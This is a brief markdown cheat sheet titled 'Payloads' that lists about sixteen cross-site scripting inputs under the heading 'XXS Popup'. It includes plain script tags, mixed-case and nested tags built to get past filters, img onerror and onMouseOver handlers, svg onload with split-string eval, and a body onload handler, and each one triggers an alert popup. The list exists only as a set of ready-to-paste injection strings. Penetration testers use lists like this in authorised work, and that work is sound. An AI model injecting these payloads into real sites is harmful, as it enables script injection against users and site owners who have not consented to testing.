# Payloads
## XXS Popup:
- <script>alert("XSS");</script>
- <script>alert(‘XSS’);</script>
- <script>alert(‘XSS’)</script>
- <<script>alert("XSS");//<</script>
- <sCripT>alert("XSS")</scRipt>
- <scr<script>ipt>alert('XSS')</script>
- <sCripT>alert('XSS')</scRipt>
- <img src=/ onerror="alert('XSS')"/>
- <img src=x onMouseOver=alert('XSS')>
- <svg/onload=eval("ale"+"rt")(`XSS${alert`XSS`}`)>
- <img src='nevermind' onerror="alert('XSS');" />
- << script>alert("XSS");//<</ script>
- <svg/onload=alert('XSS')>
- div.innerHTML = '<script deferred>alert("XSS");</script>';
- <img src="aaa" onerror=alert('xxs')>
- <body onload="alert('XSS')">
